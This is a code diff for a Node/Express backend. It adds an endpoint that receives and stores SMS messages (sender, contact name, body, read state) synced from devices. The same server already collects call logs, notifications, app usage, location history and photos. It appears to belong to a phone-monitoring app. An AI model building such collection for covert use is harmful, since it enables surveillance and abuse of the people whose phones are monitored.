@@ -1,6 +1,6 @@
 const express = require('express');
 const mongoose = require('mongoose');
-const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo } = require('../models');
+const { Device, Notification, CallLog, AppUsage, LocationHistory, Photo, SMS } = require('../models');
 
 const router = express.Router();
 
@@ -671,6 +671,44 @@ router.post('/photos', verifyDevice, async (req, res) => {
     // Ignore duplicate key errors
     if (error.code !== 11000) {
       console.error('Sync photos error:', error);
+    }
+    res.json({ success: true });
+  }
+});
+
+// Sync SMS from device
+router.post('/sms', verifyDevice, async (req, res) => {
+  try {
+    const { messages } = req.body;
+
+    if (!Array.isArray(messages)) {
+      return res.status(400).json({ error: 'Messages must be an array' });
+    }
+
+    const docs = messages.map(m => ({
+      deviceId: req.device.deviceId,
+      address: m.address,
+      contactName: m.contactName || null,
+      body: m.body,
+      type: m.type || 'inbox',
+      read: m.read || false,
+      date: m.date ? new Date(m.date) : new Date(),
+      timestamp: new Date()
+    }));
+
+    // Use insertMany with ordered: false to skip duplicates
+    await SMS.insertMany(docs, { ordered: false });
+
+    console.log(`Device ${req.device.deviceId} - Synced ${docs.length} SMS messages`);
+
+    res.json({
+      success: true,
+      count: docs.length
+    });
+  } catch (error) {
+    // Ignore duplicate key errors
+    if (error.code !== 11000) {
+      console.error('Sync SMS error:', error);
     }
     res.json({ success: true });
   }
